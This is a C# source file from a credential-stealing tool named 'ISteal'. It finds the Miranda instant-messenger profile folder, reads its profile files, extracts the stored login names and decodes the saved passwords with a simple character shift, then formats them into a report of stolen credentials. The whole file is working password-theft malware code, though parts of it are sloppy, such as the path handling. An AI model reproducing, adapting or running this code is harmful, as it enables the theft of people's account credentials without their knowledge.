using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ISteal.Password
{
    internal class Miranda
    {
        public static List<PassDataMiranda> Initialise()
        {
            List<PassDataMiranda> list = new List<PassDataMiranda>();
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Miranda\\");
            checked
            {
                if (Directory.Exists(path))
                {
                    try
                    {
                        string str = Environment.NewLine + Environment.NewLine + "Program: Miranda" +
                                     Environment.NewLine;

                        string text4 = "";
                        string text5 = "";
                        for (int i = 0; i < Directory.GetDirectories(path).Length; i++)
                        {
                            for (int j = 0; j < Directory.GetFiles(Directory.GetDirectories(path)[i]).Length; j++)
                            {
                                string[] array = Strings.Split(File.ReadAllText(Directory.GetFiles(Directory.GetDirectories(path)[i])[j]), " ", -1, CompareMethod.Binary);
                                for (int k = 0; k < array.Length; k++)
                                {
                                    string text2 = array[k];
                                    if (text2.Contains("AM_BaseProto"))
                                    {
                                        text2 = text2.Replace("\u0004", "");
                                        text2 = text2.Replace("\0", "");
                                        bool flag = false;
                                        bool flag2 = false;
                                        for (int l = 0; l <= Strings.Split(text2, "�", -1, CompareMethod.Binary).Length - 1; l++)
                                        {
                                            if (Strings.Split(text2, "�", -1, CompareMethod.Binary)[l].Length > 0)
                                            {
                                                if (flag)
                                                {
                                                    str = $"{str}{Environment.NewLine}Password: ";
                                                    int arg_137_0 = 0;
                                                    for (int m = arg_137_0; m <= Strings.Split(Strings.Split(text2, "�", -1, CompareMethod.Binary)[l], "\n", -1, CompareMethod.Binary)[0].Length - 1; m++)
                                                    {
                                                        text4 +=
                                                            Conversions.ToString(
                                                                Strings.ChrW(Strings.Split(Strings.Split(text2, "�", -1, CompareMethod.Binary)[l], "\n", -1, CompareMethod.Binary)[0][m] - '\u0005'));
                                                    }
                                                    str = str + Environment.NewLine + Environment.NewLine;
                                                    break;
                                                }
                                                if (flag2)
                                                {
                                                    str = str + Environment.NewLine + Strings.Split(text2, "�", -1, CompareMethod.Binary)[l] + Environment.NewLine;
                                                    flag2 = false;
                                                }
                                                if (Strings.Split(text2, "�", -1, CompareMethod.Binary)[l].Contains("AM_BaseProto"))
                                                {
                                                    flag2 = true;
                                                }
                                                if (Strings.Split(text2, "�", -1, CompareMethod.Binary)[l].Contains("Password"))
                                                {
                                                    text5 = Strings.Left(Strings.Split(text2, "�", -1, CompareMethod.Binary)[l], Strings.Split(text2, "�", -1, CompareMethod.Binary)[l].Length - 9);
                                                    flag = true;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        list.Add(new PassDataMiranda(text5, text4));
                        return list;
                    }
                    catch (Exception)
                    {
                        return list;
                    }
                }
                return list;
            }
        }
    }

    internal class PassDataMiranda
    {
        public string Login { get; private set; }
        public string Password { get; private set; }

        public PassDataMiranda(string login, string password)
        {
            Login = login;
            Password = password;
        }

        public override string ToString() => string.Format(
        "Program : {0}\r\n\r\nLogin : {1}\r\nPassword : {2}\r\n——————————————————————————————————",
        new object[]
        {
             "Miranda", Login, Password,
        });
    }
}